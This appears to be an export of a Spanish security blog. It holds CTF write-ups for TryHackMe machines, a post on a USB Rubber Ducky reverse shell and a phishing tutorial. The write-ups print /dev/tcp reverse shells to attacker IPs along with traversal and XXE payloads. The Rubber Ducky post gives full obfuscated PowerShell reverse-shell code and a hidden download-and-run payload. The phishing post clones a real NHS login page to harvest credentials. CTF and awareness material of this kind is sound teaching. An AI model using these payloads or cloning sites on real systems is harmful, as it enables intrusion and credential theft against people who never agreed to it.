Linux; CPE: cpe:/o:linux:linux_kernel Whatweb Ejecutamos un whatweb para ver más información sobre la web\n$ whatweb 10.10.67.245 http://10.10.67.245 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.67.245], Title[Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;team.thm\u0026#39; to your hosts!] En el titulo pone que hay que añadir team.thm en el /etc/hosts\nWeb team.thm Reconocimiento wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://team.thm/FUZZ 000000291: 301 9 L 28 W 305 Ch \u0026#34;assets\u0026#34; 000000274: 301 9 L 28 W 306 Ch \u0026#34;scripts\u0026#34; 000000016: 301 9 L 28 W 305 Ch \u0026#34;images\u0026#34; Volvemos a hacer el escaneo sobre el directorio scripts con el diccionario SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt\n$ wfuzz -c -t 200 --hc=404,403 -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt \u0026#34;http://team.thm/scripts/FUZZ.txt\u0026#34; 000000297: 200 21 L 71 W 597 Ch \u0026#34;script\u0026#34; Contenido del script.txt\n#!/bin/bash read -p \u0026#34;Enter Username: \u0026#34; REDACTED read -sp \u0026#34;Enter Username Password: \u0026#34; REDACTED echo ftp_server=\u0026#34;localhost\u0026#34; ftp_username=\u0026#34;$Username\u0026#34; ftp_password=\u0026#34;$Password\u0026#34; mkdir /home/username/linux/source_folder source_folder=\u0026#34;/home/username/source_folder/\u0026#34; cp -avr config* $source_folder dest_folder=\u0026#34;/home/username/linux/dest_folder/\u0026#34; ftp -in $ftp_server \u0026lt;\u0026lt;END_SCRIPT quote USER $ftp_username quote PASS $decrypt cd $source_folder !cd $dest_folder mget -R * quit # Updated version of the script # Note to self had to change the extension of the old \u0026#34;script\u0026#34; in this folder, as it has creds in Al final vemos que hay una nota que dice que tuvieron que cambiar la extensión del script antiguo porque tenía CREDENCIALES\nVamos a hacer fuzzing con wfuzz usando un diccionario de extensiones.\n$ wfuzz -c -t 200 --hc=404,403 -w /opt/SecLists/Fuzzing/extensions-skipfish.fuzz.txt \u0026#34;http://team.thm/scripts/script.FUZZ\u0026#34; 000000086: 200 21 L 71 W 597 Ch \u0026#34;txt\u0026#34; 000000053: 200 18 L 44 W 466 Ch \u0026#34;old\u0026#34; Ya tenemos la extensión del antiguo script. Si lo abrimos vemos las credenciales del usuario ftpuser\nFtp Nos conectamos por ftp como ftpuser. Dentro vemos que hay un archivo que se llama New_site.txt que nos lo podemos bajar a nuestra máquina con un get get New_site.txt para ver su contenido\nEl contenido del archivo es un mensaje dirijido de gyles a dale en el cual se dice que están empezando a programar una nueva web en un subdominio llamado dev y también dice que hay una copia del id_rsa en el archivo de configuración del ssh\nEsto lo podríamos haber encontrado antes con gobuster:\n$ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u team.thm -t 50 --append-domain Found: dev.team.thm Status: 200 [Size: 187] Subdominio dev.team.thm Antes que nada es importante añadir el subdominio dev al /etc/hosts\nAl entrar a http://dev.team.thm/ vemos que hay un link a http://dev.team.thm/script.php?page=teamshare.php viendo la url podemos ver que a lo mejor podemos hacer Directory Traversal Que consiste en salir del directorio y poder ver archivos del servidor\nAl probar de ir a http://dev.team.thm/script.php?page=../../../../etc/passwd Vemos que nos muestra el /etc/passwd\nSi recordamos lo que ponía en la nota de ftp, había una parte que decía que habían puesto el id_rsa de dale en el archivo de configuración del ssh así que podemos probar de ver el archivo /etc/ssh/sshd_config\nNos lo guardamos en un archivo llamado id_rsa le damos permisos con chmod chmod 600 id_rsa, por último nos conectamos por ssh ssh -i id_rsa dale@10.10.67.245\nEscalada de privilegios Gyles Con sudo -l vemos que podemos ejecutar un archivo como gyles sin proporcionar contraseña\ndale@TEAM:~$ sudo -l User dale may run the following commands on TEAM: (gyles) NOPASSWD: /home/gyles/admin_checks Si le hacemos un cat podemos ver que hay una parte en la cual se guarda un input nuestro ($error) y lo ejecuta\n#!/bin/bash printf \u0026#34;Reading stats.\\n\u0026#34; sleep 1 printf \u0026#34;Reading stats..\\n\u0026#34; sleep 1 read -p \u0026#34;Enter name of person backing up the data: \u0026#34; name echo $name \u0026gt;\u0026gt; /var/stats/stats.txt read -p \u0026#34;Enter \u0026#39;date\u0026#39; to timestamp the file: \u0026#34; error printf \u0026#34;The Date is \u0026#34; $error 2\u0026gt;/dev/null date_save=$(date \u0026#34;+%F-%H-%M\u0026#34;) cp /var/stats/stats.txt /var/stats/stats-$date_save.bak printf \u0026#34;Stats have been backed up\\n\u0026#34; dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks Reading stats. Reading stats.. Enter name of person backing up the data: test Enter \u0026#39;date\u0026#39; to timestamp the file: /bin/bash The Date is whoami gyles Ya somos gyles\n(Para que salga el prompt podemos poner script /dev/null -c bash)\nRoot En el directorio /opt/admin_stuff hay un script de root\n-rwxr--r-- 1 root root 200 Jan 17 2021 script.sh con lo siguiente:\n#!/bin/bash #I have set a cronjob to run this script every minute dev_site=\u0026#34;/usr/local/sbin/dev_backup.sh\u0026#34; main_site=\u0026#34;/usr/local/bin/main_backup.sh\u0026#34; #Back ups the sites locally $main_site $dev_site Podemos ver que ejecuta dos scripts y dice que este archivo se ejecuta cada minuto automáticamente como root\nEste archivo no lo podemos modificar pero el main_backup.sh sí.\nLo que vamos a hacer es dentro del main_backup.sh poner lo siguiente para mandarnos una reverse shell por el puerto 443\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026#34; Nos ponemos en escucha por el puerto 443 con nc y a esperar\nRecibimos la reverse shell como root!\n","date":"2023-02-09","id":100,"permalink":"/writeups/tryhackme/team/","summary":"https://tryhackme.com/room/teamcw\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.67.245\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","Fuzzing","Directory Traversal","cronjob"],"title":"Team"},{"content":"","date":"2023-02-05","id":101,"permalink":"/tags/hak5/","summary":"","tags":[],"title":"hak5"},{"content":"","date":"2023-02-05","id":102,"permalink":"/tags/reverse-shell/","summary":"","tags":[],"title":"Reverse shell"},{"content":"¿Qué es una reverse shell? Una reverse shell (conexión inversa), es una técnica utilizada en hacking para obtener acceso remoto a un dispositivo comprometido.\n\u0026ldquo;Esquema sacado de https://sshteam.com/en/conexiones-inversas-y-directas/\u0026rdquo;\nReverse shell a un windows con RubberDucky inject.ps1 Para crear la Reverse shell vamos a usar este script de PowerShell hecho por 0iphor13, nos lo tenemos que guardar en un archivo llamado inject.ps1\n$I=\u0026#39;192.168.1.142\u0026#39;;$P=443;$0LVhbQ=[TyPE](\u0026#39;tExT\u0026#39;+\u0026#39;.enCOD\u0026#39;+\u0026#39;InG\u0026#39;);$C=.(\u0026#39;New\u0026#39;+\u0026#39;-Obj\u0026#39;+\u0026#39;ect\u0026#39;) System.Net.Sockets.TCPClient($I,$P);$S=$C.GetStream();[byte[]]$b=0..65535|\u0026amp;(\u0026#39;%\u0026#39;){0};while(($i=$S.Read($b,0,$b.Length))-ne 0){;$d=(\u0026amp;(\u0026#39;New\u0026#39;+\u0026#39;-Ob\u0026#39;+\u0026#39;ject\u0026#39;) -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$X=(\u0026amp;(\u0026#39;ie\u0026#39;+\u0026#39;x\u0026#39;) $d 2\u0026gt;\u0026amp;1 | .(\u0026#39;Out\u0026#39;+\u0026#39;-St\u0026#39;+\u0026#39;ring\u0026#39;));$Z=$X+\u0026#39;ReverseDucky \u0026#39;+(\u0026amp;(\u0026#39;g\u0026#39;+\u0026#39;l\u0026#39;))+\u0026#39;~ \u0026#39;;$sbt=($0lvHBq::ASCII).GetBytes($Z);$S.Write($sbt,0,$sbt.Length);$S.Flush()};$C.Close() La variable \u0026lsquo;I\u0026rsquo; tiene que ser la ip del atacante\n$I=\u0026#39;192.168.1.142\u0026#39; La variable \u0026lsquo;P\u0026rsquo; tiene que ser el puerto por el cual vamos a estar en escucha, en este caso el puerto 443\n$P=443 Ahora desde la carpeta que tenemos guardado el script vamos a abrir un servidor con python por el puerto 80 para podernos pasar el script a la máquina víctima\nsudo python3 -m http.server 80 Rubber Ducky payload Por parte del rubberducky vamos a usar este payload\nDELAY 2500 GUI r DELAY 1000 STRING powershell -w hidden \u0026#34;IEX(New-Object Net.WebClient).downloadString(\u0026#39;http://192.168.1.142/inject.ps1\u0026#39;)\u0026#34; ENTER Este payload lo que hace es:\nEsperar 2,5 segundos Presionar windows + r para abrir el lanzador de windows Esperar 1 segundo para que se abra el lanzador de windows Ejecuta un comando que lo que hace es descargarse el inject.ps1 de la máquina del atacante desde el servidor que hemos montado previamente en python y lo ejecuta en segundo plano sin mostrar nada por pantalla Para pasarlo a binario vamos a usar la web https://ducktoolkit.com/encode, vamos a pegar ahí el script, seleccionamos el idioma que tenga el teclado de la victima, lo descargamos y lo pasamos a la micro sd del rubber ducky.\nPor último solo nos queda ponernos en escucha con netcat por el puerto 443.\nsudo nc -nlvp 443 Resultado Después de conectar el USB a la máquina víctima, en el servidor de python podemos ver como el rubber ducky a hecho una petición GET desde la máquina víctima\nDesde la terminal que estábamos en escucha por el puerto 443 con nc podemos ver que hemos recibido una conexión de la máquina víctima\nMientras que desde la máquina víctima no se ve nada raro\nVideo del resultado:\n","date":"2023-02-05","id":103,"permalink":"/blog/reverse-shell-con-el-usb-rubberducky/","summary":"Vamos a estar preparando el USB Ruber Ducky con un payload el cual no permitirá mandarnos una reverse shell desde una máquina Windows con el Windows defender activad","tags":["USB","hak5","Reverse shell"],"title":"Reverse shell con el USB RubberDucky"},{"content":"","date":"2023-02-05","id":104,"permalink":"/tags/usb/","summary":"","tags":[],"title":"USB"},{"content":"","date":"2023-02-04","id":105,"permalink":"/tags/ingenieria-social/","summary":"","tags":[],"title":"Ingenieria social"},{"content":"¿Qué es? Consiste en crear un correo, web o mensaje que se haga pasar por una empresa legítima, para que la víctima introduzca datos importantes creyéndose que lo está haciendo en el sitio real\nIngeniería social Se entiende como ingeniería social al conjunto de técnicas para manipular o engañar a las personas para infectar con archivos maliciosos u obtener información o acceso a ordenadores, redes, empresas\u0026hellip;\nTipos de phishing 📲 Smishing\nSe realiza a través de mensajes de texto\n☎️ Vishing\nSe realiza mediante llamadas telefónicas\n💿 Baiting\nSe realiza mediante USB, DVD, CD que pondrá un archivo malicioso en el dispositivo\nEjemplo de ingeniería social usando la técnica baiting en la serie Mr.Robot\nExisten varias herramientas para hacer phishings como Social-Engineer Toolkit que ya viene instalada con kali linux y parrot. Aparte de hacer phishing también sirve para hacer muchos tipos de ataques de ingeniería social. Zphisher es otra herramienta de phishing que ya viene con muchas plantillas de webs típicas instaladas\nSimulación de un phishing web con Social-Engineer Toolkit Esto se hace con fines educativos para concienciar de los peligros de internet\ngithub.com/trustedsec/social-engineer-toolki\nPara este ejemplo vamos a usar Social-Engineer Toolkit.\nLa web que vamos a clonar va a ser https://www.nhseportfolios.org/Anon/Login/Login.aspx\nY nuestro target va a ser pepito\nConfiguración Social-Engineer Toolkit Al ejecutarlo nos aparece un menu con varias opciones, vamos a escojer \u0026ldquo;Social-Engineering Attacks\u0026rdquo;, \u0026ldquo;Website Attack Vectors\u0026rdquo; y \u0026ldquo;Credential Harvester Attack Method\u0026rdquo;. Ahora nos deja 3 opciones\nWeb Templates\nEsta opción sirve para clonar webs que el programa ya tiene clonadas. Nos da la opción de Google y Twitter\nTemplate de google:\nCustom Import\nEsta opción nos permite crear la web desde 0 o importarla de forma manual. Para pasársela al programa tendremos que poner la ruta completa de donde están los archivos de la web en nuestra máquina\nSite cloner\nEsta es la opción más interesante, ya que con solo poner el enlace de una web ya nos la clona\nComo nosotros queremos clonar la web de nhseportfolios.org vamos a elegir la opción de site cloner y le proporcionamos la url\nset:webattack\u0026gt; Enter the url to clone:https://www.nhseportfolios.org/Anon/Login/Login.aspx Ahora en local vamos a tener corriendo una web exactamente igual que la original y el programa se va a quedar en escucha de conexiones\nResultado Desde el punto de vista de la víctima ahora al clicar en este enlace http://ip_atacante va a ver el clon de la web original\nAl poner credenciales. ¡Desde el lado del atacante en la terminal que estaba corriendo el programa vemos que ha reportado las credenciales!\nPOSSIBLE USERNAME FIELD FOUND: $UserName=pepito POSSIBLE PASSWORD FIELD FOUND: $Password=secret123 Este método funciona, pero no queda muy creíble que la url sea una ip.\nHay varias formas para hacerlo más creíble como por ejemplo cambiando el /etc/hosts, alojarla a un servidor o combinarla con un qr\nCambiar el /etc/hosts Hay un archivo en linux /etc/hosts/ y en windows C:\\Windows\\System32\\drivers\\etc\\hosts. Este archivo se usa para asociar ip\u0026rsquo;s a dominios. Si se añade una línea con lo siguiente\n192.168.1.142 nhseportfolios.org #IP atacante Dominio Ahora cada vez que entremos a nhseportfolios.org nos va a mandar a la 192.168.1.142. Este método funciona, pero no es muy práctico porque solo lo puedes hacer con alguien que esté en tu misma red y tienes que cambiar el etc/hosts que para hacerlo necesitas permisos de administrador en la máquina víctima, aunque con un troyano se podría cambiar. Pero no es muy eficiente\nMail La forma más típica de manda webs falsas es por correo. Los atacantes mandan los correos intentando crear una situación de pánico a la víctima para que se ponga nerviosa y clique en el enlace\nQR Otra forma de colar el phishing sería mediante un codigó qr que lleve a la página que hemos clonado. Esto lo podemos hacer en la misma herramienta Social-Engineer Toolkit en el apartado de qr\nNos pide la web que queremos que nos lleve el qr\nVemos que nos ha generado la imagen del qr y la ha guardado en /root/.set/reports/qrcode_attack.png\nEsto se puede combinar con un correo.\nComo detectarlo Antes de clicar o descargar algo de un correo se tienen que seguir estos pasos\nComprobar que la dirección es de un sitio conocido y comprobar que no tenga letras de más, letras por números, muchos puntos\u0026hellip;\nAntes de clicar a cualquier enlace es importante verificar que ese sea el original de la empresa. Si es un botón y no se ve el enlace se puede hacer \u0026ldquo;hovering\u0026rdquo; que es pasar por encima el ratón sin clicar para que salga el enlace abajo a la izquierda. Es recomendable acceder manualmente a la web y no con enlaces de correo\nMuchos ataques los hacen con traductores así que la sintaxis de los mensajes de phishing no suele ser muy buena\nRecuerda que la vulnerabilidad más grande de un dispositivo es el usuario\nComo evitarlo Es recomendable tener un antivirus en el pc, actualmente casi todos los antivirus cuentan con la opción de bloquear posibles phishings\nSi eres el técnico de una empresa lo que puedes hacer es desde el antivirus bloquear todas las posibles combinaciones que puede haber de un dominio. Por ejemplo si estás en una empresa de un banco y los empleados siempre para trabajar tienen que acceder a bancoseguro123.com puedes con la herramienta urlcrazy generar dominios parecidos al original y meterlos en una blacklist del antivirus, Siempre que no se bloquee una web legitima porque podria afectar negativamente a los trabajadores\n$ urlcrazy -r bancoseguro123.com Typo Type Typo Domain ---------------------------------------------------------------- Original bancoseguro123.com Character Omission bacoseguro123.com Character Omission bancoeguro123.com Character Omission bancosegro123.com Character Omission bancoseguo123.com Character Omission bancosegur123.com Character Omission bancoseguro12.com Character Omission bancoseguro123.cm Character Omission bancoseguro123.co Character Omission bancoseguro13.com Character Omission bancoseguro23.com Character Omission bancoseuro123.com Character Omission bancosguro123.com Character Omission bancseguro123.com Character Omission banoseguro123.com Character Omission bncoseguro123.com Character Repeat baancoseguro123.com Character Repeat banccoseguro123.com ... ... Que hacer si ya has caído en un phishing Lo primero es ponerte en contacto con el soporte de la empresa, si lo que te han robado son las contraseñas cámbialas y si tienes la misma contraseña en otra web también es importante cambiarla. Por último se puede denunciar a la policía como un delito de fraude\n","date":"2023-02-04","id":106,"permalink":"/blog/phishing/","summary":"Los casos de phishing en España han aumentado un 30% en 2022. Pero, ¿Sabes que son? ¿Qué tipos hay? ¿Cómo se hacen? ¿Cómo puedes protegerte?","tags":["Ingenieria social"],"title":"Phishing"},{"content":"https://tryhackme.com/room/startup\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.76.5\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n\u0026gt; ping -c 1 10.10.76.5 PING 10.10.76.5 (10.10.76.5) 56(84) bytes of data. 64 bytes from 10.10.76.5: icmp_seq=1 ttl=63 time=116 ms --- 10.10.76.5 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 116.037/116.037/116.037/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.76.5 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.76.5 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80 -sC -sV 10.10.76.5 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp [NSE: writeable] | -rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg |_-rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.18.108.198 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b9a60b841d2201a401304843612bab94 (RSA) | 256 ec13258c182036e6ce90e1626eba2be (ECDSA) |_ 256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Maintenance Puerto 21 (ftp) El nmap ha reportado que nos podemos conectar por ftp como anonymous. Dentro del ftp hay tres archivos: .test_log, important.jpg y notice.txt, también hay un directorio llamado ftp en el cual tenemos permisos de escritura.\nNos pasamos los tres archivos con get \u0026quot;archivo\u0026quot; para analizarlos desde nuestra máquina. Ningún archivo contienen información relevante\nPuerto 80 (http) Subdirectorios Empezamos con un escaneo de subdirectorios, vamos a usar dirb\ndirb 10.10.76.5 Nos encuentra el subdirectorio files. Dentro de files vemos que hay los mismos archivos que en el ftp, teniendo en cuenta que en el ftp había una carpeta en la cual podíamos subir archivos, podemos probar de subir una reverse shell con php para después ejecutarla desde la web.\nIntrusión Nos bajamos el .php\nwget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php Es importante cambiar las líneas de ip y puerto.\nComo normalmente la extensión .php está bloqueada, lo vamos a cambiar a .phtml\nAhora ya nos podemos volver a conectar por ftp y dentro de la carpeta ftp subir el .phtml con put\nPor último nos ponemos en escucha por el puerto 443 y desde la web ejecutamos el archivo. Ya tenemos la reverse shell\nTratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalda de privilegios Lennie En /incidents vemos un archivo el cual parece que contiene un historial de los comandos que se han ejecutado, buscando un poco vemos un sitio donde salen unas credenciales\u0026hellip;\nRoot Con la herramienta pspy podemos ver como se ejecuta automáticamente como root el archivo /home/lennie/scripts/planner.sh.\nNo tenemos permisos de escritura para este archivo, pero ese archivo ejecuta otro archivo: /etc/printf.sh, en este sí que tenemos permisos de escritura.\nDentro vamos a poner bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/442 0\u0026gt;\u0026amp;1\u0026quot; y nos vamos a poner en escucha por el puerto 442.\n¡Recibimos la conexión y YA SOMOS ROOT!!!!!\n","date":"2023-01-20","id":107,"permalink":"/writeups/tryhackme/startup/","summary":"https://tryhackme.com/room/startup\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.76.5\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","cron","file upload"],"title":"Startup"},{"content":"","date":"2023-01-19","id":108,"permalink":"/tags/cve-2019-15107/","summary":"","tags":[],"title":"CVE-2019-15107"},{"content":"","date":"2023-01-19","id":109,"permalink":"/tags/cve-2019-15231/","summary":"","tags":[],"title":"CVE-2019-15231"},{"content":"https://tryhackme.com/room/source\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.16.237\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.16.237 PING 10.10.16.237 (10.10.16.237) 56(84) bytes of data. 64 bytes from 10.10.16.237: icmp_seq=1 ttl=63 time=61.1 ms --- 10.10.16.237 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 61.096/61.096/61.096/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.16.237 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.186.98 5 │ [*] Open ports: 22,10000 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\nnsmap -p22,10000 -sC -sV 10.10.16.237 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b74cd0bde27b1b15722764562915ea23 (RSA) | 256 b78523114f44fa22008e40775ecf287c (ECDSA) |_ 256 a9fe4b82bf893459365becdac2d395ce (ED25519) 10000/tcp open http MiniServ 1.890 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Puerto 10000 El nmap ha reportado la versión del puerto 10000 (Webmin 1.890) la cual con una búsqueda rápida por google podemos ver que es vulnerable. He encontrado en github un exploit: https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE, al ejecutarlo podemos ejecutar comandos como root en el servidor, pero necesitamos pasarlos por un url encoder antes de mandarlos.\nIntrusión Como podemos ejecutar comandos como root en el servidor podemos ya directamente ver las 2 flags o mandarnos una reverse shell.\nNos ponemos en escucha por el puerto 443\nnc -nlvp 443 Ahora enviamos con el exploit el comando para mandarnos una reverse shell bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.237%2F443%200%3E%261%22. Y ya somos root\n","date":"2023-01-19","id":110,"permalink":"/writeups/tryhackme/source/","summary":"https://tryhackme.com/room/source\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.16.237\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","CVE-2019-15107","CVE-2019-15231"],"title":"Source"},{"content":"","date":"2023-01-18","id":111,"permalink":"/tags/mediana/","summary":"","tags":[],"title":"Mediana"},{"content":"https://tryhackme.com/room/mustacchio\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.131.18 PING 10.10.131.18 (10.10.131.18) 56(84) bytes of data. 64 bytes from 10.10.131.18: icmp_seq=1 ttl=63 time=372 ms --- 10.10.131.18 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 371.643/371.643/371.643/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.131.18 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.131.18 5 │ [*] Open ports: 22,80,8765 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80,8765 -sC -sV 10.10.131.18 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 581b0c0ffacf05be4cc07af1f188611c (RSA) | 256 3cfce8a37e039a302c77e00a1ce452e6 (ECDSA) |_ 256 9d59c6c779c554c41daae4d184710192 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Mustacchio | Home 8765/tcp open http nginx 1.10.3 (Ubuntu) |_http-title: Mustacchio | Login |_http-server-header: nginx/1.10.3 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Puerto 80 Al entrar a la web lo primero que vemos es lo siguiente:\nCon wfuzz vamos a buscar subdirectorios\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://10.10.131.18/FUZZ Entre todos los que encuentra hay uno llamdo custom que dentro tiene una carpeta llamada js y css. Dentro de js hay un archivo llamado users.bak. Al descargarnoslo con un strings podemos ver un usuario (admin) y un hash\nEse hash podemos probar de romperlo con la herramienta search the hash\nPuerto 8765 Dentro de este puerto hay otra web con un panel de login al cual podemos entrar con las credenciales que hemos conseguido antes. Al entrar vemos lo siguiente:\nSi lo dejamos en blanco sale una notificación que dice que tenemos que poner código XML\nViendo que abajo salen tres variables (Nombre, Autor y Comentario) podemos probar de poner un código XML con esos apartados.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;test1\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;test2\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;test3\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; Podemos probar de hacer una inyeccion xxe con el siguiente código xml para que muestre el archivo /etc/passwd\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY testxxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;\u0026amp;testxxe;\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;test2\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;test3\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; ¡Funciona!\nUsando lo mismo podemos ver la \u0026ldquo;RSA PRIVATE KEY\u0026rdquo;. Esta vez en vez del \u0026ldquo;file://\u0026rdquo; he usado \u0026ldquo;php://filter/convert.base64-encode/resource=/\u0026rdquo; para que no pierda la estructura.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY testxxe SYSTEM 